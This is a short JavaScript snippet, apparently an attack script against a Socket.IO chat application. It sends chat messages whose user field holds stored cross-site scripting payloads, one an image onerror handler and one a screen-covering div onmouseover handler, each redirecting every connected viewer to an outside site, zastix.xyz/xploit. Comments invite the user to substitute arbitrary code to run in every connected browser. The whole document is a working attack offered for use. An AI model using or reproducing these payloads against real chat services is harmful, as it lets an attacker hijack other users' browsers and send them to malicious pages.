// OnError method
xxs = `<img src="e.png" onerror="location.href='https://zastix.xyz/xploit'">`
socket.emit('chat message', {
    message: "",
    user: xxs
  })
// Put your minified code in onerror="CODE HERE"
// it will then run on everyone broswer, that is connected to the chat

// Div method
xxs = `<div style="transform:translate(-50%,-20%);width:10000px;height:10000px;background-color:black;position:absolute;" onmouseover=location.href="https://zastix.xyz/xploit">`
socket.emit('chat message', {
    message: "",
    user: xxs
  })
// Put your code in onmouseover="CODE HERE"
// When the user hovers over the DIV that is covering the screen it will run the code.
